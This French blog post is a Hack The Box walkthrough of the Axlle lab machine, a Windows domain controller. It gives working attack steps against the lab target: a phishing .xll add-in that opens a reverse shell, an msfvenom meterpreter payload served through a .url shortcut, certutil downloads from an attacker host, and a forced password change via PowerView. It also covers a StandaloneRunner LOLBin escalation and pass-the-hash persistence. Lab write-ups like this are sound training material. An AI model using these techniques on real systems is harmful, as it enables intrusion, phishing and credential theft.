<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Axlle</title>
<meta name=description content="Platforme: Hack The Box Lien: Axlle Niveau: Difficile OS: Windows Lire cet article en anglais
Axlle est un contrôleur de domaine hébergeant un serveur web et un …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-axlle/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Axlle"><meta property="og:description" content="Platforme: Hack The Box Lien: Axlle Niveau: Difficile OS: Windows Lire cet article en anglais
Axlle est un contrôleur de domaine hébergeant un serveur web et un …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Axlle/Axlle.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Axlle/Axlle.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Axlle"><meta name=twitter:description content="Platforme: Hack The Box Lien: Axlle Niveau: Difficile OS: Windows Lire cet article en anglais
Axlle est un contrôleur de domaine hébergeant un serveur web et un …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-axlle/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-axlle/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Axlle/Axlle.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-axlle/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-axlle/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Axlle</h1><small role=doc-subtitle></small><p class=post-date>9 min read |
<span class=post-date>15 Novembre 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/Axlle>Axlle</a></li><li>Niveau: Difficile</li><li>OS: Windows</li></ul><hr><p><a href=https://scorpiosec.com/posts/htb-axlle/>Lire cet article en anglais</a></p><p>Axlle est un contrôleur de domaine hébergeant un serveur web et un serveur de courrier électronique en plus des services Active Directory standard. Après notre reconnaissance, nous utilisons une attaque de phishing avec une pièce jointe <code>.xll</code> pour obtenir un accès initial au système. Sur la cible, nous découvrons un fichier <code>.eml</code> contenant des détails sur une tâche automatisée. En exploitant ces informations, nous créons un fichier <code>.url</code> malveillant, permettant un mouvement latéral vers un autre utilisateur et l&rsquo;accès au drapeau utilisateur. Avec BloodHound, nous identifions la possibilité de forcer des changements de mot de passe sur des comptes spécifiques. Grâce à ce privilège, nous effectuons un autre déplacement latéral. Enfin, l&rsquo;escalade des privilèges est réalisée par une injection de commandes via un binaire Windows.</p><p>Adresse IP cible - <code>10.10.11.21</code></p><h2 id=balayage>Balayage</h2><pre tabindex=0><code>./nmap_scan.sh 10.10.11.21 Axlle
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Running detailed scan on open ports: 25,53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,61050,61051,61052,61056,61058,61071
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-11-15 17:09 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.21
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.058s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT      STATE SERVICE       VERSION
</span></span><span style=display:flex><span>25/tcp    open  smtp          hMailServer smtpd
</span></span><span style=display:flex><span>| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP
</span></span><span style=display:flex><span>|_ <span style=color:#d19a66>211</span> DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</span></span><span style=display:flex><span>53/tcp    open  domain        Simple DNS Plus
</span></span><span style=display:flex><span>80/tcp    open  http          Microsoft IIS httpd 10.0
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|_  Potentially risky methods: TRACE
</span></span><span style=display:flex><span>|_http-title: Axlle Development
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style=display:flex><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style=color:#56b6c2>(</span>server time: 2024-11-15 23:09:51Z<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: axlle.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>445/tcp   open  microsoft-ds?
</span></span><span style=display:flex><span>464/tcp   open  kpasswd5?
</span></span><span style=display:flex><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>636/tcp   open  tcpwrapped
</span></span><span style=display:flex><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: axlle.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>3269/tcp  open  tcpwrapped
</span></span><span style=display:flex><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style=color:#56b6c2>(</span>SSDP/UPnP<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Not Found
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style=display:flex><span>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span style=display:flex><span>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>61050/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>61051/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>61052/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>61056/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>61058/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>61071/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>Service Info: Host: MAINFRAME; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2024-11-15T23:10:45
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>|_clock-skew: 7s
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   3:1:1: 
</span></span><span style=display:flex><span>|_    Message signing enabled and required
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 99.31 seconds
</span></span></code></pre></div><p>Notre cible est un contrôleur de domaine, en plus des services AD habituels, il dispose des éléments suivants:</p><ul><li>un serveur SMTP sur le port 25 avec hMailServer.</li><li>Un serveur web sur le port 80 avec Microsoft IIS.</li><li>Le nom de domaine est <code>axlle.htb</code> que nous ajoutons au fichier <code>/etc/hosts</code>.</li></ul><h2 id=enumération>Enumération</h2><p>À l&rsquo;adresse <code>http://axlle.htb/</code>, nous trouvons le site web d&rsquo;une société de développement de logiciels. Il est en cours de maintenance, mais nous obtenons une adresse e-mail pour les contacts.</p><p><img src=/images/HTB-Axlle/axlle_website.png alt="Axlle website"></p><p>Outre les informations que nous avons obtenues précédemment, rien de particulier pour ce site web. Nous essayons de forcer les répertoires, mais nous ne trouvons rien d&rsquo;intéressant.</p><pre tabindex=0><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://axlle.htb/ 
</code></pre><p><img src=/images/HTB-Axlle/gobuster_axlle.png alt="directory brute forcing attempt"></p><p>Notre tentative d&rsquo;énumération des sous-domaines est tout aussi infructueuse.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://axlle.htb -H &#34;Host: FUZZ.axlle.htb&#34; -ic -fs 10228
</code></pre><p><img src=/images/HTB-Axlle/ffuf_axlle.png alt="subdomain enumeration attempt"></p><h2 id=accès-initial>Accès initial</h2><p>Nous avons appris précédemment que les pièces jointes que nous envoyons à <code>accounts@axlle.htb</code> doivent être en format excel, mais nous ne pouvons pas utiliser les macros puisqu&rsquo;elles sont désactivées. Une autre façon de créer des e-mails de phishing est d&rsquo;utiliser des fichiers <code>xll</code>.</p><blockquote><p>Les fichiers <code>.xll</code> sont des fichiers Excel Add-In utilisés pour étendre les fonctionnalités de Microsoft Excel.</p></blockquote><p>Sur <a href=https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/office-attacks/#xll-exec>ce site</a> nous trouvons un exploit appelé <code>XLL - EXEC</code> que nous pouvons utiliser pour obtenir un reverse shell en envoyant un email avec une pièce jointe <code>.xll</code>. La première étape consiste à ajouter un reverse shell à l&rsquo;exploit.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#7f848e>#include</span> <span style=color:#7f848e>&lt;windows.h&gt;</span><span style=color:#7f848e>
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span>
</span></span><span style=display:flex><span><span style=color:#c678dd>__declspec</span>(<span style=color:#e06c75>dllexport</span>) <span style=color:#e5c07b>void</span> <span style=color:#c678dd>__cdecl</span> <span style=color:#61afef;font-weight:700>xlAutoOpen</span>(<span style=color:#e5c07b>void</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>void</span> <span style=color:#c678dd>__cdecl</span> <span style=color:#61afef;font-weight:700>xlAutoOpen</span>() {
</span></span><span style=display:flex><span>    <span style=color:#61afef;font-weight:700>WinExec</span>(<span style=color:#98c379>&#34;PowerShell#3 from revshells.com&#34;</span>, <span style=color:#d19a66>1</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>BOOL</span> <span style=color:#e06c75>APIENTRY</span> <span style=color:#61afef;font-weight:700>DllMain</span>(<span style=color:#e06c75>HMODULE</span> <span style=color:#e06c75>hModule</span>,
</span></span><span style=display:flex><span>    <span style=color:#e06c75>DWORD</span>  <span style=color:#e06c75>ul_reason_for_call</span>,
</span></span><span style=display:flex><span>    <span style=color:#e06c75>LPVOID</span> <span style=color:#e06c75>lpReserved</span>
</span></span><span style=display:flex><span>) {
</span></span><span style=display:flex><span>    <span style=color:#c678dd>switch</span> (<span style=color:#e06c75>ul_reason_for_call</span>) {
</span></span><span style=display:flex><span>    <span style=color:#c678dd>case</span> <span style=color:#e06c75>DLL_PROCESS_ATTACH</span>:
</span></span><span style=display:flex><span>    <span style=color:#c678dd>case</span> <span style=color:#e06c75>DLL_THREAD_ATTACH</span>:
</span></span><span style=display:flex><span>    <span style=color:#c678dd>case</span> <span style=color:#e06c75>DLL_THREAD_DETACH</span>:
</span></span><span style=display:flex><span>    <span style=color:#c678dd>case</span> <span style=color:#e06c75>DLL_PROCESS_DETACH</span>:
</span></span><span style=display:flex><span>        <span style=color:#c678dd>break</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#e06c75>TRUE</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Nous compilons ensuite le programme C dans une bibliothèque partagée.</p><pre tabindex=0><code>x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll phishing.c -luser32
</code></pre><p><img src=/images/HTB-Axlle/xll_compilation.png alt="xll compilation"></p><p>Enfin, nous envoyons l&rsquo;e-mail avec <a href=https://github.com/jetmore/swaks>swaks</a>.</p><p><img src=/images/HTB-Axlle/phishing_email.png alt="phishing email sent"></p><pre tabindex=0><code>swaks --to accounts@axlle.htb --from kscorpio@axlle.htb --header &#34;Subject: Open the doors&#34; --body &#34;Nothing to see here...&#34; --attach @shell.xll
</code></pre><p>Après quelques minutes, nous obtenons un shell sous le nom de <code>gideon.hamill</code>.</p><p><img src=/images/HTB-Axlle/foothold.png alt="shell as gideon.hamill"></p><h3 id=impasse-exploitation-de-la-base-de-données>Impasse (exploitation de la base de données)</h3><p>Ce compte n&rsquo;a rien d&rsquo;intéressant dans les répertoires communs tels que <code>Desktop</code>, <code>Documents</code>, et <code>Downloads</code>; nous devons probablement chercher ailleurs. Par expérience, nous savons que <code>hMailServer</code> a généralement un mot de passe dans son fichier <code>INI</code>. Nous y accédons à <code>C:\Program Files (x86)\hMailServer\Bin\hMailServer.INI</code> et découvrons le mot de passe de l&rsquo;administrateur et le mot de passe de la base de données.</p><p><img src=/images/HTB-Axlle/hmailserver_pwds.png alt="hMailServer passwords found"></p><p>Nous ne parvenons pas à déchiffrer le premier hachage, mais si nous réussissons à récupérer le mot de passe de la base de données, nous pourrons peut-être récupérer les mots de passe de certains utilisateurs. Nous utilisons <a href=https://github.com/GitMirar/hMailDatabasePasswordDecrypter>ce décrypteur</a> pour trouver le mot de passe de la base de données, <code>4A02D41C55AC</code></p><p><img src=/images/HTB-Axlle/database_pwd.png alt="database password"></p><p>Puisque le type de base de données est <code>MSSQLCE</code>, nous pouvons télécharger le fichier <code>.sdf</code> sur notre machine locale (j&rsquo;ai utilisé la commande <code>download</code> dans un shell meterpreter). Le fichier <code>.sdf</code> se trouve dans <code>C:\Program Files (x86)\hMailServer\Database</code>.</p><p><img src=/images/HTB-Axlle/sdf_file_location.png alt="sdf file location"></p><blockquote><p>Un fichier <code>.sdf</code> (SQL Server Compact Database File) est un format de base de données utilisé par Microsoft SQL Server Compact Edition (SQL CE).</p></blockquote><p>Allez sur <a href=https://www.rebasedata.com>rebasedata</a> et convertissez votre fichier <code>.sdf</code> en format <code>sqlite</code>.</p><p><img src=/images/HTB-Axlle/sdf_file_conversion.png alt="sdf file conversion"></p><p>Une fois la conversion terminée, téléchargez le fichier <code>result.zip</code>. Extrayez-le et vous obtiendrez un fichier appelé <code>data.sqlite</code>. Exécutez les requêtes suivantes et vous trouverez un hash pour <code>accounts@axlle.htb</code>.</p><pre tabindex=0><code>sqlite3 data.sqlite
.tables
SELECT * FROM hm_accounts;
</code></pre><p><img src=/images/HTB-Axlle/db_hashes.png alt="database password hash found"></p><p>Malheureusement, nous ne sommes pas en mesure de craquer ce hachage, il n&rsquo;y a rien de plus à faire pour ce processus d&rsquo;exploitation, alors cherchons une autre voie.</p><p><img src=/images/HTB-Axlle/hmailserver_hashcrack_fail.png alt="hmailserver hash cracking failure"></p><h3 id=exploitation-du-fichier-url-shell-en-tant-que-dallonmatrix>Exploitation du fichier .URL (shell en tant que dallon.matrix)</h3><p>Dans <code>C:\Program Files (x86)\hMailServer\Data\axlle.htb\dallon.matrix\2F</code> nous trouvons un fichier <code>.eml</code>.</p><blockquote><p>Un fichier <code>.eml</code> est un message électronique enregistré au format standard MIME RFC 822. Ces fichiers sont généralement créés par des programmes de messagerie tels que Microsoft Outlook, Mozilla Thunderbird, etc. Le format de fichier <code>.eml</code> préserve l&rsquo;en-tête, le corps et les pièces jointes du message original, ce qui le rend utile pour l&rsquo;archivage et le transfert des messages électroniques.</p></blockquote><p><img src=/images/HTB-Axlle/eml_file.png alt="eml file location"></p><p>Nous l&rsquo;envoyons à notre machine locale par FTP (cela peut aussi être fait avec la commande <code>download</code> de meterpreter utilisée plus tôt).</p><pre tabindex=0><code>pip3 install pyftpdlib
python3 -m pyftpdlib --port 21 --write
</code></pre><p>Sur la cible, nous exécutons la commande ci-dessous et recevons le fichier eml sur le serveur FTP:</p><pre tabindex=0><code>(New-Object Net.WebClient).UploadFile(&#39;ftp://YOUR_IP/{2F7523BD-628F-4359-913E-A873FCC59D0F}.eml&#39;, &#39;C:\Program Files (x86)\hMailServer\Data\axlle.htb\dallon.matrix\2F\{2F7523BD-628F-4359-913E-A873FCC59D0F}.eml&#39;)
</code></pre><p><img src=/images/HTB-Axlle/eml_file_dl.png alt="eml file download"></p><p>Nous apprenons que nous pouvons placer des liens dans le dossier <code>C:\inetpub\testing</code>, et que ces derniers seront automatiquement exécutés.</p><p><img src=/images/HTB-Axlle/webdev-team-email.png alt="content of eml file"></p><p>Nous pouvons transférer un fichier <code>.url</code> qui pointe vers un fichier malveillant dans le dossier <code>testing</code>.</p><blockquote><p>Les fichiers <code>.url</code> sont communément appelés raccourcis internet. Ils sont utilisés pour créer des raccourcis vers des sites web ou des ressources web, permettant aux utilisateurs d&rsquo;y accéder rapidement sans avoir à naviguer dans un navigateur web.</p></blockquote><ol><li>Créer un fichier <code>.exe</code> avec msfvenom.</li></ol><pre tabindex=0><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=PORT_NUMBER -f exe -o payload.exe
</code></pre><p><img src=/images/HTB-Axlle/malicious_exe.png alt="malicious exe file"></p><ol start=2><li>Configurer le listener dans Metasploit.</li></ol><pre tabindex=0><code>use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost YOUR_IP
set lport PORT_NUMBER
run
</code></pre><ol start=3><li>Créer le fichier <code>.url</code> avec le contenu suivant.</li></ol><pre tabindex=0><code>[InternetShortcut]
URL=file://YOUR_IP/share/payload.exe
</code></pre><ol start=4><li>Lancer un serveur SMB et un serveur web.</li></ol><pre tabindex=0><code>impacket-smbserver -smb2support share .

python3 -m http.server
</code></pre><p><img src=/images/HTB-Axlle/smb-server.png alt="smb server"></p><ol start=5><li>Placer le fichier .url dans le dossier de test.</li></ol><pre tabindex=0><code>certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/evil.url evil.url
</code></pre><p><img src=/images/HTB-Axlle/evil_url_download.png alt="evil url file download"></p><p>Après quelques secondes, nous obtenons un shell meterpreter en tant que <code>dallon.matrix</code>.</p><p><img src=/images/HTB-Axlle/dallon_shell.png alt="dallon.matrix shell"></p><p>Nous obtenons également le hachage du mot de passe de <code>dallon.matrix</code> sur le serveur SMB.</p><p><img src=/images/HTB-Axlle/dallon_pwd_hash.png alt="dallon.matrix password hash"></p><p>Mais nous ne parvenons pas à le craquer.</p><pre tabindex=0><code>hashcat -a 0 -m 5600 dallon_hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><p><img src=/images/HTB-Axlle/dallon_hashcrack_fail.png alt="dallon.matrix password hash crack failure"></p><p>Sur le bureau, nous trouvons le drapeau utilisateur.</p><p><img src=/images/HTB-Axlle/user_flag.png alt="user flag"></p><h3 id=mouvement-latéral-shell-en-tant-que-bazhumphries>Mouvement latéral (shell en tant que baz.humphries)</h3><p>Pour l&rsquo;énumération de l&rsquo;Active Directory, nous utiliserons <a href=https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe>SharpHound.exe</a>.</p><pre tabindex=0><code>certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/SharpHound.exe sharphound.exe
</code></pre><p>Après l&rsquo;avoir exécuté, téléchargez le fichier <code>zip</code>.</p><p><img src=/images/HTB-Axlle/sharphound_zip_file.png alt="sharphound zip file"></p><p>Décompressez-le et importez les fichiers dans Bloodhound.</p><p>Trouvez <code>dallon.matrix</code> et vous verrez qu&rsquo;il est membre du groupe <code>Web Devs</code>.</p><p><img src=/images/HTB-Axlle/web_devs_group.png alt="web devs group"></p><p>Les membres du groupe <code>Web Devs</code> peuvent changer le mot de passe de <code>Baz.Humphries</code> et <code>Jacob.Greeny</code> à cause de <code>ForceChangePassword</code> dont nous pouvons abuser avec <a href=https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1>PowerView</a>.</p><blockquote><p>Cet attribut de compte permet d&rsquo;appliquer un changement de mot de passe même sans connaître le mot de passe actuel de l&rsquo;utilisateur. <em>Pour en savoir plus, cliquez <a href=https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#forcechangepassword>ici</a>.</em></p></blockquote><p><img src=/images/HTB-Axlle/ForeceChangePassword.png alt=ForceChangePassword></p><p>Nous importons PowerView sur la cible.</p><pre tabindex=0><code>certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/PowerView.ps1 powerview.ps1

Import-Module ./powerview.ps1
</code></pre><p>Nous changeons le mot de passe de <code>baz.humphries</code>.</p><pre tabindex=0><code>$pass = ConvertTo-SecureString &#39;PleaseLetMeIn007!&#39; -AsPlainText -Force

Set-DomainUserPassword -Identity Baz.Humphries -AccountPassword $pass
</code></pre><p><img src=/images/HTB-Axlle/password_change.png alt="Baz Humphries password change"></p><p>Nous nous connectons avec evil-winrm en tant que <code>baz.humphries</code>.</p><pre tabindex=0><code>evil-winrm -u &#34;baz.humphries&#34; -p PleaseLetMeIn007! -i axlle.htb
</code></pre><p><img src=/images/HTB-Axlle/baz_humphries_login.png alt="Baz Humphries login"></p><h2 id=elévation-de-privilèges>Elévation de Privilèges</h2><p>Dans <code>C:\App Development\kbfiltr</code> nous trouvons un fichier <code>README.md</code>. L&rsquo;une des lignes se lit comme suit &ldquo;<strong>NOTE: I have automated the running of <code>C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe</code> as SYSTEM to test and debug this driver in a standalone environment</strong>&rdquo;.</p><p><img src=/images/HTB-Axlle/README-location.png alt="README location"></p><p><a href=https://github.com/nasbench/Misc-Research/blob/main/LOLBINs/StandaloneRunner.md>Cette page Github</a> montre comment exploiter <code>StandaloneRunner.exe</code>.</p><ol><li>Créer un fichier <code>reboot.rsf</code>, avec le contenu suivant. Ce fichier doit se trouver dans le même répertoire que <code>standalonerunner.exe</code> et <code>standalonexml.dll</code>.</li></ol><pre tabindex=0><code>myTestDir
True
</code></pre><ol start=2><li><p>Créer un répertoire avec la structure suivante <code>myTestDir\working</code>.</p></li><li><p>Créer un fichier <code>rsf.rsf</code> vide dans <code>myTestDir\working</code>.</p></li><li><p>Créez <code>command.txt</code> avec le reverse shell dans le même répertoire que <code>standalonerunner.exe</code>. (pour le reverse shell, j&rsquo;ai utilisé PowerShell #3 (Base64) sur <a href=https://www.revshells.com/>revshells.com</a>)</p></li></ol><p>Nous pouvons utiliser le script powershell ci-dessous pour automatiser toutes ces étapes.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#e06c75>certutil</span>.<span style=color:#e06c75>exe</span> <span style=color:#e06c75>-urlcache</span> <span style=color:#e06c75>-split</span> <span style=color:#56b6c2>-f</span> <span style=color:#98c379>&#34;http://YOUR_IP:WEBSERVER_PORT/reboot.rsf&#34;</span> <span style=color:#98c379>&#34;reboot.rsf&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>New-Item</span> <span style=color:#e06c75>-Path</span> <span style=color:#98c379>&#34;myTestDir\working&#34;</span> <span style=color:#e06c75>-ItemType</span> <span style=color:#98c379>&#34;Directory&#34;</span> <span style=color:#e06c75>-Force</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>New-Item</span> <span style=color:#e06c75>-Path</span> <span style=color:#98c379>&#34;myTestDir\working&#34;</span> <span style=color:#e06c75>-Name</span> <span style=color:#98c379>&#34;rsf.rsf&#34;</span> <span style=color:#e06c75>-ItemType</span> <span style=color:#98c379>&#34;File&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>certutil</span>.<span style=color:#e06c75>exe</span> <span style=color:#e06c75>-urlcache</span> <span style=color:#e06c75>-split</span> <span style=color:#56b6c2>-f</span> <span style=color:#98c379>&#34;http://YOUR_IP:WEBSERVER_PORT/command.txt&#34;</span> <span style=color:#98c379>&#34;command.txt&#34;</span>
</span></span></code></pre></div><p><img src=/images/HTB-Axlle/exploit_script.png alt="exploit script"></p><p>Après quelques secondes, nous obtenons un shell en tant qu&rsquo;administrateur et nous pouvons lire le drapeau root.</p><p><img src=/images/HTB-Axlle/root_flag.png alt="root flag"></p><h2 id=persistance>Persistance</h2><p>Notre accès au compte administrateur est un processus long et fastidieux. Afin d&rsquo;établir la persistance, nous pouvons passer à un shell meterpreter et extraire les hashs avec <code>hashdump</code>. Nous récupérons alors les hachages des mots de passe de nombreux comptes sur la cible.</p><p><img src=/images/HTB-Axlle/hashdump.png alt="hashdump command"></p><p>Nous n&rsquo;avons même pas besoin de les craquer, puisque nous pouvons les utiliser avec evil-winrm pour nous connecter.</p><pre tabindex=0><code>evil-winrm -u &#34;Administrator&#34; -H 6322b5b9f9daecb0fefd594fa6fafb6a -i dc.axlle.htb
</code></pre><p><img src=/images/HTB-Axlle/Admin-login.png alt="administrator login via evil-winrm"></p><p>Merci d&rsquo;avoir lu cet article!</p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-blazorized/>&#8592;
Précédent:
HTB: Blazorized</a></p><p class=prev-post-date>novembre 7, 2024</p></div><div class=next-post><p><a href=/fr/posts/htb-compiled/>Suivant:
HTB: Compiled
&#8594;</a></p><p class=next-post-date>décembre 13, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès initial</a><ul><li><a href=#impasse-exploitation-de-la-base-de-données>Impasse (exploitation de la base de données)</a></li><li><a href=#exploitation-du-fichier-url-shell-en-tant-que-dallonmatrix>Exploitation du fichier .URL (shell en tant que dallon.matrix)</a></li><li><a href=#mouvement-latéral-shell-en-tant-que-bazhumphries>Mouvement latéral (shell en tant que baz.humphries)</a></li></ul></li><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a></li><li><a href=#persistance>Persistance</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>